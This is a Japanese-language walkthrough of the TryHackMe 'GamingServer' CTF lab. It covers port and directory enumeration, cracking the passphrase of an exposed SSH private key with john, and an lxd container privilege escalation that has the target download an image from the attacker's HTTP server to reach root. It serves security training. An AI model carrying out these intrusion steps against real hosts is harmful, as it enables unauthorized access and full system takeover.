# GamingServer CTF

https://tryhackme.com/room/gamingserver

## Enumeration

### ポートスキャン

```shell
TARGET=10.10.232.209
root@ip-10-10-117-56:~# sudo nmap -sS -p- $TARGET
Starting Nmap 7.80 ( https://nmap.org ) at 2025-03-02 00:37 GMT
Nmap scan report for 10.10.232.209
Host is up (0.00037s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 02:70:49:2F:8E:BB (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 3.32 seconds
root@ip-10-10-117-56:~# sudo nmap -sV -p22,80 $TARGET
Starting Nmap 7.80 ( https://nmap.org ) at 2025-03-02 00:37 GMT
Nmap scan report for 10.10.232.209
Host is up (0.00015s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
MAC Address: 02:70:49:2F:8E:BB (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### gobuster

```shell
root@ip-10-10-117-56:~# gobuster dir -x=txt,php -u http://$TARGET -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 30
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.232.209
[+] Method:                  GET
[+] Threads:                 30
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              txt,php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 278]
/about.php            (Status: 200) [Size: 2213]
/uploads              (Status: 301) [Size: 316] [--> http://10.10.232.209/uploads/]
/robots.txt           (Status: 200) [Size: 33]
/secret               (Status: 301) [Size: 315] [--> http://10.10.232.209/secret/]
/server-status        (Status: 403) [Size: 278]
Progress: 654825 / 654828 (100.00%)
===============================================================
Finished
===============================================================
```

### /index.html
```html
<!-- john, please add some actual content to the site! lorem ipsum is horrible to look at. -->
```

### /uploads

/uploads/dict.lst ・・・パスワードリスト  
/uploads/manifesto.txt　・・・ハッカーマニフェスト  
/uploads/meme.jpg  ・・・隠し情報は見つからない

### /secret

/secret/secretKey

```text
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,82823EE792E75948EE2DE731AF1A0547

T7+F+3ilm5FcFZx24mnrugMY455vI461ziMb4NYk9YJV5uwcrx4QflP2Q2Vk8phx
H4P+PLb79nCc0SrBOPBlB0V3pjLJbf2hKbZazFLtq4FjZq66aLLIr2dRw74MzHSM
FznFI7jsxYFwPUqZtkz5sTcX1afch+IU5/Id4zTTsCO8qqs6qv5QkMXVGs77F2kS
Lafx0mJdcuu/5aR3NjNVtluKZyiXInskXiC01+Ynhkqjl4Iy7fEzn2qZnKKPVPv8
9zlECjERSysbUKYccnFknB1DwuJExD/erGRiLBYOGuMatc+EoagKkGpSZm4FtcIO
IrwxeyChI32vJs9W93PUqHMgCJGXEpY7/INMUQahDf3wnlVhBC10UWH9piIOupNN
SkjSbrIxOgWJhIcpE9BLVUE4ndAMi3t05MY1U0ko7/vvhzndeZcWhVJ3SdcIAx4g
/5D/YqcLtt/tKbLyuyggk23NzuspnbUwZWoo5fvg+jEgRud90s4dDWMEURGdB2Wt
w7uYJFhjijw8tw8WwaPHHQeYtHgrtwhmC/gLj1gxAq532QAgmXGoazXd3IeFRtGB
6+HLDl8VRDz1/4iZhafDC2gihKeWOjmLh83QqKwa4s1XIB6BKPZS/OgyM4RMnN3u
Zmv1rDPL+0yzt6A5BHENXfkNfFWRWQxvKtiGlSLmywPP5OHnv0mzb16QG0Es1FPl
xhVyHt/WKlaVZfTdrJneTn8Uu3vZ82MFf+evbdMPZMx9Xc3Ix7/hFeIxCdoMN4i6
8BoZFQBcoJaOufnLkTC0hHxN7T/t/QvcaIsWSFWdgwwnYFaJncHeEj7d1hnmsAii
b79Dfy384/lnjZMtX1NXIEghzQj5ga8TFnHe8umDNx5Cq5GpYN1BUtfWFYqtkGcn
vzLSJM07RAgqA+SPAY8lCnXe8gN+Nv/9+/+/uiefeFtOmrpDU2kRfr9JhZYx9TkL
wTqOP0XWjqufWNEIXXIpwXFctpZaEQcC40LpbBGTDiVWTQyx8AuI6YOfIt+k64fG
rtfjWPVv3yGOJmiqQOa8/pDGgtNPgnJmFFrBy2d37KzSoNpTlXmeT/drkeTaP6YW
RTz8Ieg+fmVtsgQelZQ44mhy0vE48o92Kxj3uAB6jZp8jxgACpcNBt3isg7H/dq6
oYiTtCJrL3IctTrEuBW8gE37UbSRqTuj9Foy+ynGmNPx5HQeC5aO/GoeSH0FelTk
cQKiDDxHq7mLMJZJO0oqdJfs6Jt/JO4gzdBh3Jt0gBoKnXMVY7P5u8da/4sV+kJE
99x7Dh8YXnj1As2gY+MMQHVuvCpnwRR7XLmK8Fj3TZU+WHK5P6W5fLK7u3MVt1eq
Ezf26lghbnEUn17KKu+VQ6EdIPL150HSks5V+2fC8JTQ1fl3rI9vowPPuC8aNj+Q
Qu5m65A5Urmr8Y01/Wjqn2wC7upxzt6hNBIMbcNrndZkg80feKZ8RD7wE7Exll2h
v3SBMMCT5ZrBFq54ia0ohThQ8hklPqYhdSebkQtU5HPYh+EL/vU1L9PfGv0zipst
gbLFOSPp+GmklnRpihaXaGYXsoKfXvAxGCVIhbaWLAp5AybIiXHyBWsbhbSRMK+P
-----END RSA PRIVATE KEY-----
```

### robots.txt

```text
user-agent: *
Allow: /
/uploads/
```

## SSH

見つかった john ユーザーと秘密鍵を使ってSSH接続を試みると、パスフレーズを聞かれる。

秘密鍵からパスフレーズをクラック

```shell
$ ssh2john ./id_rsa_sec > hash.txt      

$ john --wordlist=/usr/share/wordlists/rockyou.txt ./hash.txt
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
letmein          (./id_rsa_sec)     
1g 0:00:00:00 DONE (2025-03-01 19:50) 3.448g/s 1765p/s 1765c/s 1765C/s teiubesc..letmein
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

letmein と判明。

```shell
john@exploitable:~$ cat user.txt
a5c.................
```

ユーザーフラグゲット。

## 権限昇格

```shell
john@exploitable:~$ id
uid=1000(john) gid=1000(john) groups=1000(john),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)
```

sudo -l を実行したいがパスワードが分からないのでできない。

```shell
john@exploitable:~$ ls -al
total 60
drwxr-xr-x 8 john john  4096 Jul 27  2020 .
drwxr-xr-x 3 root root  4096 Feb  5  2020 ..
lrwxrwxrwx 1 john john     9 Jul 27  2020 .bash_history -> /dev/null
-rw-r--r-- 1 john john   220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 john john  3771 Apr  4  2018 .bashrc
drwx------ 2 john john  4096 Feb  5  2020 .cache
drwxr-x--- 3 john john  4096 Jul 27  2020 .config
drwx------ 3 john john  4096 Feb  5  2020 .gnupg
drwxrwxr-x 3 john john  4096 Jul 27  2020 .local
-rw-r--r-- 1 john john   807 Apr  4  2018 .profile
drwx------ 2 john john  4096 Feb  5  2020 .ssh
-rw-r--r-- 1 john john     0 Feb  5  2020 .sudo_as_admin_successful
-rw-rw-r-- 1 john john    33 Feb  5  2020 user.txt
drwxr-xr-x 2 root root  4096 Feb  5  2020 .vim
-rw------- 1 root root 12070 Jul 27  2020 .viminfo
```

vim関連のファイルがrootになっているので、sudoでvimが指定されているのではないかと想像した。

読み取り可能なファイルにパスワードがないか探したが見つからなかった。

ここでギブアップしてウォークスルーを見た。

### lxd 権限昇格

https://www.hackingarticles.in/lxd-privilege-escalation/

#### kaliで実行
```shell
git clone  https://github.com/saghul/lxd-alpine-builder.git
cd lxd-alpine-builder
sudo ./build-alpine

python -m http.server
```

#### ターゲットで実行

```shell
# ダウンロード
john@exploitable:~$ cd /tmp
john@exploitable:/tmp$ wget http://10.2.22.182:8000/alpine-v3.13-x86_64-20210218_0139.tar.gz

# イメージをインポート
john@exploitable:/tmp$ lxc image import ./alpine-v3.13-x86_64-20210218_0139.tar.gz --alias myimage
Image imported with fingerprint: cd73881adaac667ca3529972c7b380af240a9e3b09730f8c8e4e6a23e1a7892b
john@exploitable:/tmp$ lxc image list
+---------+--------------+--------+-------------------------------+--------+--------+-----------------------------+
|  ALIAS  | FINGERPRINT  | PUBLIC |          DESCRIPTION          |  ARCH  |  SIZE  |         UPLOAD DATE         |
+---------+--------------+--------+-------------------------------+--------+--------+-----------------------------+
| myimage | cd73881adaac | no     | alpine v3.13 (20210218_01:39) | x86_64 | 3.11MB | Mar 2, 2025 at 2:05am (UTC) |
+---------+--------------+--------+-------------------------------+--------+--------+-----------------------------+

# コンテナの実行
john@exploitable:/tmp$ lxc init myimage ignite -c security.privileged=true
Creating ignite
john@exploitable:/tmp$ lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
Device mydevice added to ignite
john@exploitable:/tmp$ lxc start ignite
john@exploitable:/tmp$ lxc exec ignite /bin/sh

~ # whoami
root
~ # cd /mnt/root/root
/mnt/root/root # ls
root.txt
/mnt/root/root # cat root.txt
2e3................
```

## 振り返り

- lxd 権限昇格を学べたのが大きな収穫。
- vim関連ファイルのオーナーがrootになっていたことで、sudoを実行するしかない→パスワードを知るしかないと思い込んでしまい、他の権限に注目できなかった。
